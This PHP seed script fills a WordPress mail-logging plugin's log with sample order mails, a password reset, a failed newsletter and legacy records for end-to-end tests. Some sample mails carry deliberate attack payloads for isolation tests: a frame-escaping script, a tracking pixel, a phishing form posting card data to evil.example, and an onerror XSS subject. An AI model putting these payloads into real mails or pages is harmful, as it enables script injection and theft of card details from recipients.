<?php
/**
 * Seeds the log for the browser tests and screenshots: 60 HTML order mails (with a tracking
 * pixel, an injected script and a form), a password reset, a failed mail and an XSS subject.
 *
 * phpcs:disable WordPress.NamingConventions.PrefixAllGlobals
 *
 * @package Mailspur
 */

require '/wordpress/wp-load.php';

// Pretend delivery succeeded (Playground has no mail server) – except for the newsletter, which goes the real
// PHPMailer route and fails with a genuine error message.
add_filter(
	'pre_wp_mail',
	static function ( $result, $atts ) {
		return false !== strpos( $atts['subject'], 'newsletter' ) ? null : true;
	},
	10,
	2
);

// Every 10th mail is hostile (tracking pixel, injected script, phishing form, secret link) for the
// isolation tests; the rest is a clean order confirmation (also used for the directory screenshots).
$attack = '<html><head><style>h1{color:#b32d2e;font-family:Georgia,serif}</style></head><body>'
	. '<h1>Thanks for your order!</h1><p>Hi <b>Jan</b>, your order is on its way. 👍</p>'
	. '<img src="https://example.com/pixel.gif" width="1" height="1" alt="">'
	. '<script>parent.document.body.innerHTML = "PWNED"; window.top.pwned = 1;</script>'
	. '<p><a href="https://shop.example/my-account/?key=wc_order_SECRET123">View order</a></p>' // gitleaks:allow – fake secret, checks that the log redacts it.
	. '<form action="https://evil.example/collect"><input name="card"><button>Confirm</button></form>'
	. '</body></html>';

$clean = static function ( $name, $order ) {
	return '<div style="max-width:560px;margin:0 auto;font-family:Helvetica,Arial,sans-serif;color:#1d2327">'
		. '<div style="background:#2271b1;color:#fff;padding:24px 28px;border-radius:8px 8px 0 0"><h1 style="margin:0;font-size:22px">Thanks for your order</h1></div>'
		. '<div style="border:1px solid #dcdcde;border-top:0;padding:24px 28px;border-radius:0 0 8px 8px">'
		. '<p>Hi ' . ucfirst( $name ) . ',</p><p>we have received your order <b>#' . $order . '</b> and will ship it within 24 hours.</p>'
		. '<table style="width:100%;border-collapse:collapse;margin:16px 0">'
		. '<tr><td style="padding:8px 0;border-bottom:1px solid #f0f0f1">Coaching session (60 min)</td><td style="text-align:right">€49.00</td></tr>'
		. '<tr><td style="padding:8px 0;border-bottom:1px solid #f0f0f1">Replay analysis</td><td style="text-align:right">€19.00</td></tr>'
		. '<tr><td style="padding:8px 0"><b>Total</b></td><td style="text-align:right"><b>€68.00</b></td></tr></table>'
		. '<p><a href="https://shop.example/my-account/view-order/' . $order . '/?key=wc_order_SECRET" style="background:#2271b1;color:#fff;padding:10px 16px;border-radius:4px;text-decoration:none">View order</a></p>'
		. '<p style="color:#646970;font-size:13px">Example Shop · Musterstraße 1 · 12345 Berlin</p></div></div>';
};

$names = array( 'jan', 'lena', 'mia', 'noah', 'emma', 'paul', 'lea', 'ben', 'hannah', 'finn' );
for ( $i = 0; $i < 60; $i++ ) {
	wp_mail(
		$names[ $i % 10 ] . $i . '@example.com',
		sprintf( '[Example Shop] Your order #%d has been received', 125600 + $i ),
		0 === $i % 10 ? $attack : $clean( $names[ $i % 10 ], 125600 + $i ),
		array( 'Content-Type: text/html; charset=UTF-8', 'From: Example Shop <shop@example.com>' )
	);
}

wp_mail(
	array( 'anna@example.com', 'Bob <bob@example.org>' ),
	'Password reset',
	"Reset your password: https://site.example/wp-login.php?action=rp&key=AbCdEf123&login=anna\n\nThanks"
);
wp_mail( 'subscribers@example.com', 'Your weekly newsletter', 'This week: new coaching slots.' );
wp_mail( 'x@example.com', '<img src=x onerror=alert(1)>XSS subject', '<b>plain?</b>' );

// An old WP Mail Logging table in its own format (literal ",\n" lists, site-local time) for the import UI.
global $wpdb;
$wpdb->query( "CREATE TABLE {$wpdb->prefix}wpml_mails (mail_id INTEGER PRIMARY KEY AUTO_INCREMENT, timestamp DATETIME NOT NULL, host VARCHAR(200) NOT NULL DEFAULT '0', receiver VARCHAR(200) NOT NULL DEFAULT '0', subject VARCHAR(200) NOT NULL DEFAULT '0', message TEXT NULL, headers TEXT NULL, attachments VARCHAR(800) NOT NULL DEFAULT '0', error VARCHAR(400) NULL DEFAULT '', plugin_version VARCHAR(200) NOT NULL DEFAULT '0')" ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery, WordPress.DB.PreparedSQL.InterpolatedNotPrepared
foreach ( array( 'Old welcome mail', 'Old invoice', 'Old newsletter' ) as $i => $subject ) {
	$wpdb->insert( // phpcs:ignore WordPress.DB.DirectDatabaseQuery
		$wpdb->prefix . 'wpml_mails',
		array(
			'timestamp'   => gmdate( 'Y-m-d H:i:s', time() - ( 3 + $i ) * DAY_IN_SECONDS ),
			'receiver'    => 'legacy' . $i . '@example.com',
			'subject'     => $subject,
			'message'     => '<p>From the old log</p>',
			'headers'     => 'From: Shop <shop@example.com>,\nContent-Type: text/html; charset=UTF-8',
			'attachments' => '',
			'error'       => 2 === $i ? 'SMTP Error: Could not authenticate.' : '',
		)
	);
}

// Tell tests/e2e/wait-for-wordpress.js that the blueprint has finished.
if ( is_dir( '/e2e-out' ) ) {
	file_put_contents( '/e2e-out/seeded', gmdate( 'c' ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents
}
